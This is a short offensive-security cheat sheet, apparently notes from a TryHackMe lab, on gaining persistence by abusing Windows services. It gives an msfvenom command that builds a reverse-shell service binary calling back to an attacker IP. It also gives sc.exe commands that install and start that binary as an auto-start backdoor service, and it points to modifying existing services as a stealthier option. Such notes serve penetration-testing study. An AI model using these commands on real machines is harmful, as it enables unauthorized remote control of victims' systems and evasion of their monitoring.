# Windows Persistence - Abusing Services

Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

## Creating backdoor services

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$ATTACKER_IP LPORT=$LPORT -f exe-service -o rev-svc.exe
```

```powershell
sc.exe create <servicename> binPath= "C:\Windows\rev-svc.exe" start= auto
sc.exe start <servicename>
```

## Modifying Existing services

More stealthy as service creation may be monitored across network.

```powershell
sc.exe query state=all
sc.exe qc $target-service
```


## References

[THM Windows Persistence Room](https://tryhackme.com/room/windowslocalpersistence)